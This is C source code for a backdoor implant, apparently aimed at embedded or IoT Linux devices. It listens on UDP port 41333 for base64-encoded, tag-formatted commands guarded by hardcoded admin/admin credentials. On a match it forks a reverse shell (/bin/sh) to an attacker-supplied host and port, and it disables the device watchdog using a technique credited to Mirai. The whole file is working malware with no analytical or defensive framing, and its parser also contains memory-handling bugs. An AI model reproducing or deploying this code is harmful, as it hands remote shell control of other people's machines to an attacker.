#include <arpa/inet.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include "x41.h"

#define PASS "admin"
#define USER "admin"

pid_t pid_door;

char enc[BASE64_BUF]; // for encode in base64 buffor 
char dec[BASE64_BUF]; // for decode in base64 buffor

static int decode_base64_to_6bit(int c)
{
  if (c >= 'A' && c <= 'Z') {
    return c - 'A';
  } else if (c >= 'a' && c <= 'z') {
    return c - 'a' + 26;
  } else if (c >= '0' && c <= '9') {
    return c - '0' + 52;
  } else if (c == '+') {
    return 62;
  } else if (c == '/') {
    return 63;
  } else if (c == '=') {
    return 0;
  } else {
	return -1;
  }
}
 
static void *decode_base64(char *src)
{
  unsigned int o[4];
  char *p = dec;
  size_t i;
 
  for (i = 0; src[i]; i += 4) {
	if(decode_base64_to_6bit(src[i]) < 0) return NULL;
    o[0] = decode_base64_to_6bit(src[i]);
    o[1] = decode_base64_to_6bit(src[i + 1]);
    o[2] = decode_base64_to_6bit(src[i + 2]);
    o[3] = decode_base64_to_6bit(src[i + 3]);
 
    *p++ = (o[0] << 2) | ((o[1] & 0x30) >> 4);
    *p++ = ((o[1] & 0xf) << 4) | ((o[2] & 0x3c) >> 2);
    *p++ = ((o[2] & 0x3) << 6) | (o[3] & 0x3f);
  }
 
  *p = '\0';
  return dec;
}

int tag_format(char* body, char *name, char *resolve, size_t buf_size){

	char *start_tag = (char*)malloc(sizeof(char) * (strlen(name) + 16));
	char *end_tag = (char*)malloc(sizeof(char) * (strlen(name) + 16));
	char *r= (char*)malloc(sizeof(char) * strlen(body) + 32);
	char *str_str;
	char *str_end;

	if(start_tag == NULL && end_tag ==NULL && r == NULL) return -3;
	strcpy(r, body);

	sprintf(start_tag, "<%s>",name);
	sprintf(end_tag, "</%s>",name);
	
	if((str_str = strstr(r, start_tag)) != NULL \
		&& (str_end = strstr(r, end_tag)) != NULL){
		str_str = &str_str[strlen(start_tag)];
	}else{
		free(start_tag);
		free(end_tag);
		free(r);
		return -1;
	}
	
	memset(strstr(str_str, end_tag),0,
			sizeof(sizeof(char)*strlen(str_end)));
	
	if(strlen(str_str) < buf_size){
		strcpy(resolve, str_str);
	}else{

		free(start_tag);
		free(end_tag);
		free(r);
		return -3;
	}
	
	free(start_tag);
	free(end_tag);
	free(r);
	
	return 1;
}


// the following algorrithm provides a reverse shell 
static int door(char *rhost, int rport){
	struct sockaddr_in Door;
	int door_sock;
		
	// execution in command
	char *argv[] = {"/bin/sh", NULL};
	
	memset(&Door, 0, sizeof(Door));

	door_sock = socket(AF_INET, SOCK_STREAM, 0);
	if(door_sock < 0){
		memset(&Door, 0, sizeof(Door));
		exit(42);
	}
	
	Door.sin_family =AF_INET;
	Door.sin_port = htons(rport);
	Door.sin_addr.s_addr = inet_addr(rhost);
	
	if(connect(door_sock,(struct sockaddr * )&Door, sizeof(struct sockaddr)) < 0){
		close(door_sock);
		memset(&Door, 0, sizeof(Door));
		exit(42);		
	}else{
		dup2(door_sock, 0);
		dup2(door_sock, 1);
		dup2(door_sock, 2);
		execve(argv[0], argv, NULL);
		memset(&Door, 0, sizeof(Door));
		exit(42);
	}
}

static void waitng(){
	int status;
	// if the process terminates 
	pid_door = wait(&status);
}

static void door_session(short session_port){	
	char buf[MESSAGE_BUF];		// for raw data
	char valus[MESSAGE_BUF];	// for decode data
	char *decode_body;          // 
	char *pass = PASS;			// authentication password 
	char *user = USER;			// authentication username
	char set_pass[SETUSER_BUF];	// confirmation buffer in password
	char set_user[SETUSER_BUF];	// confirmation buffer in username
	char host[DSTHOST_BUF];		// dst host in buffer
	char port[DSTPORT_BUF];		// dst port in buffer
	short port_s;				// dst_char_port to dst_short_port
	
	struct sockaddr_in addr;
	struct sockaddr_in senderinfo;
	socklen_t size;
	int socket_udp;	
	
	memset(&addr, 0, sizeof(addr));
	memset(&senderinfo, 0, sizeof(senderinfo));

	socket_udp = socket(AF_INET, SOCK_DGRAM, 0);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(session_port);
	addr.sin_addr.s_addr = INADDR_ANY;
		
	bind(socket_udp, (struct sockaddr *)&addr, sizeof(addr));
	
	while(1){
		size = sizeof(senderinfo);
		memset(buf, 0, sizeof(buf));
		recvfrom(socket_udp, buf, sizeof(buf) - 1, 0,
				(struct sockaddr *)&senderinfo, &size);
		// retun response

		sendto(socket_udp, buf, strlen(buf),
				0, (struct sockaddr *)&senderinfo, size);
		
		// encode data to decode
		decode_body = decode_base64(buf);
		// check in base64 format for buffer text
		if(decode_body != NULL){
			// check in authentication infomation 
			if(tag_format(decode_body, "DOOR",valus, sizeof(valus))
					&& tag_format(valus, "PASS", set_pass, sizeof(set_pass)) 
					&& tag_format(valus, "USER", set_user, sizeof(set_user)) 
					&& strcmp(pass,set_pass) == 0 
					&& strcmp(user, set_user) == 0 
					&& tag_format(valus ,"HOST", host, sizeof(host)) 
					&& tag_format(valus, "PORT", port, sizeof(port)) 
					&& sscanf(port, "%hd", &port_s) == 1){
				//generate fork
			
				pid_door = fork();
				switch(pid_door){
					case 0:
						// run to with if correct authentication info
						door(host, port_s);
				}
				// wait in reverse sehll finish
				waitng();
			} 
		}
	};
	
	return;
}

int main(){
	int wfd;
	short session_port = 41333;  // session port
	// generate fork
	
	pid_t pid_d;
	pid_d = fork();
	
	// watchdog invalid 
	// by MIRAI
	if((wfd = open("/dev/watchdog", 2)) != -1 ||
        (wfd = open("/dev/misc/watchdog", 2)) != -1){
        int one = 1;
		// HeartBeat 0x80045704 & 0x80045705
        ioctl(wfd, 0x80045704, &one);
        close(wfd);
        wfd = 0;
    };

	switch(pid_d){
		case 0:
			// if there is no proble, whih the fork run
			door_session(session_port);
			return 0;
	}
	
	return 0;
}

